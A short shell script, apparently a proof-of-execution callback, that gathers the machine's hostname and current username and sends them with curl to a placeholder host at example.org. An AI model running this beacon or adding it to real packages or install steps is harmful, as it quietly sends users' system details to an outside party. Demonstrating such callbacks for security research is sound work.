#!/bin/sh
HOST=$(hostname)
USER=$(whoami)
URL="https://example.org/evidence?hostname=$HOST&whoami=$USER"
curl -fsS "$URL"
